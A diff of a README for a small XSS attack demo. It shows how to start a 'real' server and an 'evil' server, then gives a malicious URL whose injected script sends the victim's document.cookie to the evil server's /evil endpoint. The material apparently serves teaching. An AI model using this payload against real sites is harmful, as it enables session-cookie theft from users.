@@ -1,20 +1,26 @@
 # XSS Attack demo
 
+This quick implementation demonstrates XSS in action.
+
 Start the real server:
 
 ```
+cd realserver
+
 npm i
 node app.js
 ```
 
-Start the evil server in a new terminal session:
+In a new terminal session, start the evil server 👹:
 
 ```
 cd evilserver
+
+npm i
 node evil.js
 ```
 
-Open the browser and send a malicious request:
+In a web browser, send the malicious request:
 
 ```
 http://localhost:3000?txid=TX999<script>new Image().src=`http://localhost:3666/evil?cookie=${document.cookie}`</script>
